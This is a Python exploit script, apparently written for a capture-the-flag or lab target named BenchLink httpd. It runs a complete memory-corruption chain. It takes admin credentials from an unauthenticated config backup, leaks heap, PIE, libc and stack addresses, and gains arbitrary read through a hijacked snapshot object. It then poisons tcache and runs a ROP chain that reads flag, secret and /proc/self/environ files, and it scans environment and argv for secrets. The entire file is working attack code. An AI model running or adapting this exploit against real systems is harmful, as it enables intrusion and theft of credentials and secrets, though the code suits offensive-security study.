#!/usr/bin/env python3
"""BenchLink httpd exploit - multi-path variant (recon).

Heap chain is the one independently verified by the team (work/verify_local/xpl.py):
  heap leak -> layout pre-check -> snapshot arbitrary read -> libc leak ->
  stack leak -> tcache poison -> stack ROP.

This variant adds:
  * a 1280-byte job used as a "long chain" buffer at a known heap address;
  * after the libc/stack leaks it writes a 6-path ORW chain into that buffer
    via the /evidence primitive and reads it back to verify the address;
  * the 0x120 final ROP body only does: pop rbp; long_addr; leave; ret
    (stack pivot into the heap chain) -> open/read/write for 6 candidates;
  * an optional env/argv scan through the snapshot arbitrary read (cheap
    insurance if the deployment passes the flag in the environment).
"""
import argparse
import struct
import sys

import blclient

POP_RDI = 0x277E5
POP_RSI = 0x28F99
POP_RDX = 0xFDF0D
POP_RBP = 0x276EC
LEAVE = 0x4DF29
XCHG_EAX_EDI = 0x141DCC
OPEN = 0xF7FC0
READ = 0xF82A0
WRITE = 0xF8340
SLEEP = 0xD3D50
ENVIRON = 0x1DB320
UNSORTED_OFF = 0x1D3CC0

S0 = 0x480
SNAP_REQ = 0x90
JOB90 = 0x90
JOB17 = 0x120
LONG_REQ = 1280
DELTA_RET = 0x38F0

DEFAULT_PATHS = ['/flag', '/flag.txt', '/app/flag.txt',
                 '/app/flag', '/root/flag', '/proc/self/environ',
                 '/secret', '/app/secret']
PATH_OFF = 0x400


def r2s(n):
    return (n + 8 + 15) & ~15


def printable(buf):
    out = bytearray()
    for b in buf:
        if 32 <= b < 127 or b in (9, 10, 13):
            out.append(b)
        else:
            out.append(0x2E)
    return bytes(out)


class Exploit:
    def __init__(self, port, host='127.0.0.1', verbose=True, do_envscan=True,
                 paths=None, mode='pivot'):
        self.b = blclient.Bench(host=host, port=port)
        self.H = None
        self.top = S0
        self.verbose = verbose
        self.jobs = {}
        self.paths = list(paths or DEFAULT_PATHS)
        self.do_envscan = do_envscan
        self.mode = mode
        self.env_hits = []

    def log(self, *a):
        if self.verbose:
            print(*a, file=sys.stderr, flush=True)

    def top_alloc(self, req):
        off = self.top
        self.top += r2s(req)
        return off

    def addr(self, off):
        assert self.H is not None
        return self.H + off

    # --- wrappers ---
    def create(self, data):
        st, j = self.b.create_job(data)
        if st != 200 or 'id' not in j:
            raise RuntimeError('create failed %s %r' % (st, j))
        return j['id']

    def create_top(self, req, data=None):
        off = self.top_alloc(req)
        if data is None:
            data = bytes([0x41 + (len(str(off)) % 26)]) * req
        if len(data) != req:
            raise RuntimeError('bad create_top size')
        jid = self.create(data)
        self.jobs[jid] = off
        a = self.H + off if self.H is not None else 0
        self.log('  create id=%d off=%#x addr=%#x req=%#x' % (jid, off, a, req))
        return jid, off

    def create_pop(self, data, note=''):
        jid = self.create(data)
        self.log('  create(pop) id=%d %s' % (jid, note))
        return jid

    def cancel(self, jid):
        st, hd, body = self.b.cancel(jid)
        if st != 200:
            raise RuntimeError('cancel %d failed %s %r' % (jid, st, body))
        self.log('  cancel id=%d -> %r' % (jid, body[:40]))

    def revision(self, jid, three):
        assert len(three) == 3
        st, hd, body = self.b.revision(jid, three)
        if st != 200:
            raise RuntimeError('revision %d failed %s %r' % (jid, st, body))
        self.log('  revision id=%d bytes=%s -> %r' % (jid, three.hex(), body[:40]))

    def evidence(self, jid, data):
        st, hd, body = self.b.evidence(jid, data)
        if st != 200:
            raise RuntimeError('evidence %d failed %s %r' % (jid, st, body))

    def receipt(self, jid):
        st, rec = self.b.receipt(jid)
        if st != 200 or 'record_tag' not in rec:
            raise RuntimeError('receipt %d failed %s %r' % (jid, st, rec))
        return int(rec['record_tag'], 16)

    def snapshot(self):
        st, hd, body = self.b.snapshot_post()
        if st != 200:
            raise RuntimeError('snapshot failed %s %r' % (st, body))

    def snapshots_get(self):
        st, j = self.b.snapshot_get()
        if st != 200:
            raise RuntimeError('snapshots get failed %s %r' % (st, j))
        return j

    # --- arbitrary read through the hijacked snapshot object ---
    def read_ptr(self, addr):
        body = bytearray(0x41 for _ in range(0x90))
        struct.pack_into('<Q', body, 0x10, addr)
        body[0x18] = 0x41
        body[0x19] = 0
        self.evidence(self.c8, bytes(body))
        j = self.snapshots_get()
        return int(j['trace_tag'], 16)

    def read_bytes(self, addr, n):
        out = bytearray()
        for i in range(0, n, 8):
            out += struct.pack('<Q', self.read_ptr(addr + i))
        return bytes(out)

    # --- env/argv scan (safe, before ROP) ---
    def envscan(self, envp, argv0, maxvars=20):
        keys = (b'flag', b'secret', b'ctf', b'gz')
        try:
            for i in range(maxvars):
                p = self.read_ptr(envp + 8 * i)
                if p == 0:
                    break
                s = self.read_bytes(p, 16).split(b'\x00')[0]
                if any(k in s.lower() for k in keys):
                    full = self.read_bytes(p, 128).split(b'\x00')[0]
                    self.env_hits.append(('env', full))
                    self.log('  ENVHIT %r' % full)
            for i in range(4):
                p = self.read_ptr(argv0 + 8 * (i + 1))
                if p == 0:
                    break
                s = self.read_bytes(p, 32).split(b'\x00')[0]
                self.log('  argv[%d]=%r' % (i + 1, s))
                if any(k in s.lower() for k in keys):
                    self.env_hits.append(('argv', s))
        except Exception as exc:
            self.log('  envscan skipped: %s' % exc)
        return self.env_hits

    # --- long heap chain: open N paths, read, write all, sleep ---
    def build_long_chain(self, T, addr):
        base = self.libc
        n = len(self.paths)
        bufs = [T + 0x400 + i * 0x200 for i in range(n)]
        # path strings live at addr+PATH_OFF
        strblob = bytearray()
        ptrs = []
        for p in self.paths:
            ptrs.append(addr + PATH_OFF + len(strblob))
            strblob += p.encode() + b'\x00'
        if PATH_OFF + len(strblob) > 1280:
            raise RuntimeError('path strings overflow long buffer')
        q = []
        for i, ptr in enumerate(ptrs):
            q += [base + POP_RDI, ptr,
                  base + POP_RSI, 0,
                  base + OPEN,
                  base + XCHG_EAX_EDI,
                  base + POP_RSI, bufs[i],
                  base + POP_RDX, 0x200,
                  base + READ]
        q += [base + POP_RDX, 0x200,
              base + POP_RDI, 1]
        for b in bufs:
            q += [base + POP_RSI, b, base + WRITE]
        q += [base + SLEEP, 0xDEADBEEF]
        if 8 + 8 * len(q) > PATH_OFF:
            raise RuntimeError('chain overlaps path strings')
        body = bytearray(1280)
        struct.pack_into('<Q', body, 0, 0x5152535455565758)  # dummy rbp
        for i, v in enumerate(q):
            struct.pack_into('<Q', body, 8 + 8 * i, v & 0xFFFFFFFFFFFFFFFF)
        body[PATH_OFF:PATH_OFF + len(strblob)] = strblob
        return bytes(body), q, ptrs

    # --- tiny first stage: pop rbp; leave; ret -> pivot to heap chain ---
    def build_stage(self):
        base = self.libc
        q = [base + POP_RBP, self.long_addr, base + LEAVE]
        body = bytearray(0x120)
        body[0:8] = b'JUNKJUNK'
        for i, v in enumerate(q):
            struct.pack_into('<Q', body, 8 + 8 * i, v & 0xFFFFFFFFFFFFFFFF)
        return bytes(body), q

    # --- classic two-path chain (verified by the team) ---
    def build_classic(self, T):
        base = self.libc
        buf1 = T + 0x400
        buf2 = T + 0x600
        p1 = self.addr(0x480)
        p2 = self.addr(0x490)
        q = [base + POP_RDI, p1,
             base + POP_RSI, 0,
             base + OPEN, base + XCHG_EAX_EDI,
             base + POP_RSI, buf1,
             base + POP_RDX, 0x200,
             base + READ,
             base + POP_RDI, p2,
             base + POP_RSI, 0,
             base + OPEN, base + XCHG_EAX_EDI,
             base + POP_RSI, buf2,
             base + POP_RDX, 0x200,
             base + READ,
             base + POP_RDI, 1,
             base + POP_RSI, buf1,
             base + WRITE,
             base + POP_RSI, buf2,
             base + WRITE,
             base + SLEEP, 0xDEADBEEF]
        body = bytearray(0x120)
        body[0:8] = b'JUNKJUNK'
        for i, v in enumerate(q):
            struct.pack_into('<Q', body, 8 + 8 * i, v & 0xFFFFFFFFFFFFFFFF)
        return bytes(body), q

    def leak_flag(self, rop):
        st, hd, body = self.b.req('POST', '/api/service/jobs', rop,
                                  {'Content-Type': 'application/octet-stream'})
        return st, body

    # --- main flow ---
    def run(self):
        b = self.b
        # config-backup.bin is unauthenticated: re-read the admin credentials at
        # fire time so a rebuilt/rotated instance still works (fallback=static).
        user = pw = None
        try:
            st, hd, bk = b.req('GET', '/cgi-bin/config-backup.bin')
            if st == 200:
                for line in bk.split(b'\n'):
                    if line.startswith(b'admin_user='):
                        user = line.split(b'=', 1)[1].strip().decode('latin1')
                    elif line.startswith(b'admin_password='):
                        pw = line.split(b'=', 1)[1].strip().decode('latin1')
            self.log('[*] backup creds: user=%r pw_len=%d' %
                     (user, len(pw) if pw else 0))
        except Exception as exc:
            self.log('[*] backup creds fetch failed: %s' % exc)
        if user and pw:
            st, body = b.login(user, pw)
        else:
            st, body = b.login()
        assert st == 200, (st, body)
        st, jobs = b.jobs()
        if st != 200:
            raise RuntimeError('jobs get failed %s' % st)
        njobs = len(jobs.get('jobs', []))
        st, snaps = b.snapshot_get()
        nsnap = snaps.get('count') if st == 200 else -1
        self.log('[*] preflight jobs=%d snapshots=%s' % (njobs, nsnap))
        if njobs or nsnap:
            raise RuntimeError('target process is NOT fresh (jobs=%d snapshots=%s)'
                               % (njobs, nsnap))
        st, body = b.authorize()
        assert st == 200 and b'field_service_authorized' in body, (st, body)
        self.log('[*] authorized')

        # B: heap base leak
        self.log('[B] heap base leak')
        ja, offa = self.create_top(JOB17)
        self.cancel(ja)
        tag = self.receipt(ja)
        self.log('  receipt tag=%#018x' % tag)
        if tag >= (1 << 40):
            raise RuntimeError('heap tag looks wrong: %#x' % tag)
        self.H = tag << 12
        self.log('  candidate heap base H=%#x' % self.H)

        strings = bytearray(0x42 for _ in range(JOB17))
        for p, off in zip(self.paths[:3], (0x0, 0x10, 0x20)):
            pb = p.encode() + b'\x00'
            strings[off:off + len(pb)] = pb
        self.l2 = self.create_pop(bytes(strings), 'pop L (paths live here)')
        assert self.top == 0x5B0, hex(self.top)

        # P removed to free 12 job slots for the long-chain pivot buffer;
        # [D] still cross-checks the heap model against the unsorted-bin fd.

        # C: snapshot arbitrary read
        self.log('[C] snapshot arbitrary read')
        self.S1_off = self.top_alloc(SNAP_REQ)
        self.S1 = self.addr(self.S1_off)
        self.snapshot()
        self.S2_off = self.top_alloc(SNAP_REQ)
        self.S2 = self.addr(self.S2_off)
        self.snapshot()
        self.log('  S1=%#x S2=%#x' % (self.S1, self.S2))
        j8a, j8a_off = self.create_top(JOB90)
        j8b, j8b_off = self.create_top(JOB90)
        self.cancel(j8a)
        self.cancel(j8b)
        A8a = self.addr(j8a_off)
        A8b = self.addr(j8b_off)
        if ((A8a ^ self.S2) >> 24) != 0:
            raise RuntimeError('snapshot poison delta crosses 16MB')
        stored = ((A8b >> 12) ^ self.S2) & 0xFFFFFFFFFFFFFFFF
        self.revision(j8b, struct.pack('<I', stored & 0xFFFFFF)[:3])
        self.b8 = self.create_pop(bytes([0x43]) * JOB90, 'pop J8b')
        fake = bytearray(0x41 for _ in range(JOB90))
        struct.pack_into('<Q', fake, 0x10, self.S1)
        fake[0x18] = 0x41
        fake[0x19] = 0
        self.c8 = self.create_pop(bytes(fake), 'pop S2 / overwrite snapshot')
        j = self.snapshots_get()
        tag = int(j['trace_tag'], 16)
        self.pie = tag - 0x5270
        self.log('  trace_tag=%#x -> pie=%#x' % (tag, self.pie))
        if not (0 < self.pie < (1 << 48)) or (self.pie & 0xFFF):
            raise RuntimeError('bad PIE leak %#x' % tag)

        # D: libc leak + cross-check
        self.log('[D] libc leak + layout cross-check')
        ks = []
        for _ in range(10):
            jid, off = self.create_top(JOB17)
            ks.append(jid)
        # L: long-chain heap buffer (1280-byte job, known address); allocated
        # above K9 so freeing K9 cannot merge into top (replaces old guard K10).
        self.long_id = None
        self.long_addr = 0
        if self.mode == 'pivot':
            self.log('[L] long-chain heap buffer')
            self.long_id, long_off = self.create_top(LONG_REQ,
                                                     data=bytes([0x50]) * LONG_REQ)
            self.long_addr = self.addr(long_off)
            self.log('  long chain buffer @ %#x (id=%d)' %
                     (self.long_addr, self.long_id))
        for jid in ks[:8]:
            self.cancel(jid)
        self.cancel(ks[9])
        self.k_ids = ks
        self.k_offs = [self.jobs[j] for j in ks]
        libc_leak = self.receipt(ks[7])
        k8_actual = self.receipt(ks[9])
        k8_model = self.addr(self.k_offs[7])
        self.log('  K8.fd=%#x  K10.fd=%#x  K8_model=%#x' %
                 (libc_leak, k8_actual, k8_model))
        if k8_actual != k8_model - 0x10:
            raise RuntimeError('HEAP LAYOUT MISMATCH actual=%#x model=%#x'
                               % (k8_actual, k8_model))
        self.libc = libc_leak - UNSORTED_OFF
        if self.libc & 0xFFF:
            raise RuntimeError('libc base not aligned: %#x' % self.libc)
        self.log('  libc base=%#x (layout validated)' % self.libc)

        # E: stack leak
        self.log('[E] stack leak')
        envp = self.read_ptr(self.libc + ENVIRON)
        self.log('  environ value (envp) = %#x' % envp)
        rsp_initial = None
        argc = None
        for k in range(1, 12):
            addr = envp - 8 - 8 * k
            v = self.read_ptr(addr)
            self.log('    scan k=%d addr=%#x val=%#x' % (k, addr, v))
            if v < 0x1000000:
                argc = v
                rsp_initial = addr
                break
        if rsp_initial is None:
            raise RuntimeError('argc scan failed')
        self.argc = argc
        T_pred = rsp_initial - DELTA_RET
        S_pred = T_pred + 8
        lo, hi = self.pie + 0x2000, self.pie + 0x9250
        v = self.read_ptr(S_pred)
        self.log('  argc=%d rsp_initial=%#x T_pred=%#x S_pred=%#x slot=%#x' %
                 (argc, rsp_initial, T_pred, S_pred, v))
        if not (lo <= v < hi):
            found = None
            for dq in range(-8, 9):
                cand_S = S_pred + dq * 8
                if cand_S % 16 != 8:
                    continue
                vv = self.read_ptr(cand_S)
                self.log('    stack scan S=%#x -> %#x' % (cand_S, vv))
                if lo <= vv < hi:
                    found = cand_S
                    break
            if found is None:
                raise RuntimeError('could not locate main return slot')
            S_pred = found
        self.T = S_pred - 8
        if self.T % 16:
            raise RuntimeError('bad ROP target alignment %#x' % self.T)
        self.log('  stack target S=%#x T_stack=%#x (validated)' % (S_pred, self.T))

        if self.do_envscan:
            self.log('[E2] env/argv scan')
            hits = self.envscan(envp, rsp_initial)
            for kind, s in hits:
                self.log('  %s HIT: %r' % (kind, s))

        # build payload
        if self.mode == 'pivot':
            long_body, lq, ptrs = self.build_long_chain(self.T, self.long_addr)
            self.log('[G] write long chain via evidence (%d qwords, %d paths)' %
                     (len(lq), len(ptrs)))
            self.evidence(self.long_id, long_body)
            # verify the heap address by reading the chain back
            got = self.read_bytes(self.long_addr + 8, 8)
            want = struct.pack('<Q', (self.libc + POP_RDI) & 0xFFFFFFFFFFFFFFFF)
            if got != want:
                raise RuntimeError('long chain verify failed: %r != %r'
                                   % (got, want))
            strchk = self.read_bytes(self.long_addr + PATH_OFF, 16)
            self.log('  chain verify OK, strings=%r' % strchk)
            rop, q = self.build_stage()
        else:
            rop, q = self.build_classic(self.T)
        self.log('  final body qwords=%d mode=%s T=%#x' % (len(q), self.mode, self.T))

        # F: tcache poison to TC, fake struct, allocate at T_stack
        self.log('[F] tcache struct overwrite + ROP')
        TC = self.H + 0x10
        k7_id = self.k_ids[6]
        k7 = self.addr(self.k_offs[6])
        k6 = self.addr(self.k_offs[5])
        if ((k6 ^ TC) >> 24) != 0:
            raise RuntimeError('TC poison delta crosses 16MB')
        stored = ((k7 >> 12) ^ TC) & 0xFFFFFFFFFFFFFFFF
        self.log('  TC=%#x K7=%#x K6=%#x' % (TC, k7, k6))
        self.revision(k7_id, struct.pack('<I', stored & 0xFFFFFF)[:3])
        self.p17 = self.create_pop(bytes([0x44]) * JOB17, 'pop K7 -> TC')
        fake = bytearray(0x120)
        struct.pack_into('<H', fake, 0x22, 1)        # counts[17]
        struct.pack_into('<Q', fake, 0x108, self.T)  # entries[17]
        self.q17 = self.create_pop(bytes(fake), 'fake tcache struct at TC')
        st, body = self.leak_flag(rop)
        self.log('  final status=%s bodylen=%d' % (st, len(body)))
        return st, body


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument('--host', default='127.0.0.1')
    ap.add_argument('--port', type=int, default=18080)
    ap.add_argument('--paths', default=','.join(DEFAULT_PATHS))
    ap.add_argument('--mode', default='pivot', choices=['pivot', 'classic'])
    ap.add_argument('--no-envscan', action='store_true')
    ap.add_argument('--out', default='evidence/remote_pivot_out.bin')
    args = ap.parse_args()
    paths = [p for p in args.paths.split(',') if p]
    if args.mode == 'classic':
        paths = paths[:2]
    e = Exploit(args.port, args.host,
                do_envscan=not args.no_envscan,
                paths=paths, mode=args.mode)
    st, body = e.run()
    print('RESULT H=%#x pie=%#x libc=%#x T=%#x' %
          (e.H or 0, getattr(e, 'pie', 0), getattr(e, 'libc', 0), getattr(e, 'T', 0)))
    print('STATUS', st)
    print('RAWBODY_REPR', repr(body[:4096]))
    print('PRINTABLE')
    sys.stdout.write(printable(body).decode('latin1'))
    print()
    if getattr(e, 'env_hits', None):
        print('ENV_HITS', repr(e.env_hits))
    if args.out:
        with open(args.out, 'wb') as f:
            f.write(b'RESULT H=%#x pie=%#x libc=%#x T=%#x\n' %
                    (e.H or 0, getattr(e, 'pie', 0), getattr(e, 'libc', 0),
                     getattr(e, 'T', 0)))
            f.write(b'STATUS %d\n' % st)
            f.write(body)
    return 0


if __name__ == '__main__':
    sys.exit(main())
